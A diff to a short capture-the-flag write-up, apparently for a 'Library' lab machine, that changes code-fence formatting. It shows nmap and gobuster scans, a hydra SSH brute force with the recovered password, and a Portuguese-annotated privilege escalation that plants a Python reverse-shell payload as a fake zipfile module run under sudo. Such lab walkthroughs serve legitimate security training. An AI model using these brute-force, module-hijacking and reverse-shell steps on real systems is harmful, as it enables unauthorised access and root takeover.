@@ -1,4 +1,4 @@
-'''
+```
 ┌──(xnv㉿Kali)-[~]
 └─$ nmap -A 10.10.200.31                                                                
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-26 08:17 EST
@@ -17,9 +17,9 @@ PORT   STATE SERVICE VERSION
 |_http-title: Welcome to  Blog - Library Machine
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-'''
+```
 
-'''
+```
 ┌──(xnv㉿Kali)-[~]
 └─$ gobuster dir -w directory-list-2.3-small.txt -u http://library.thm/ -t 100 -x txt,html,php
 ===============================================================
@@ -40,26 +40,27 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /images               (Status: 301) [Size: 311] [--> http://library.thm/images/]
 /index.html           (Status: 200) [Size: 5439]                                
 /robots.txt           (Status: 200) [Size: 33]                                  
-'''
+```
 
-'''
+```
 http://library.thm/robots.txt
 agent: rockyou 
 Disallow: /
-'''
+```
 
-'''┌──(xnv㉿Kali)-[~]
+```
+┌──(xnv㉿Kali)-[~]
 └─$ hydra -l meliodas -P rockyou.txt 10.10.200.31 ssh  
 
 [22][ssh] host: 10.10.200.31   login: meliodas   password: iloveyou1
-'''
+```
 
-'''
+```
 meliodas@ubuntu:~$ cat user.txt 
 ***************************
-'''
+```
 
-'''
+```
 No arquivo bak.py , ele tem o import zipfile
 
 então cria um arquivo chamado zipfile.py e coloca o reverse
@@ -72,12 +73,13 @@ os.dup2(s.fileno(),0);
 os.dup2(s.fileno(),1); 
 os.dup2(s.fileno(),2);
 p=subprocess.call(["/bin/sh","-i"]);
-'''
+```
 
-'''
+```
 meliodas@ubuntu:~$ sudo python3 /home/meliodas/bak.py
-'''
+```
 
-'''
+```
 # cat /root/root.txt
 ******************************
+```
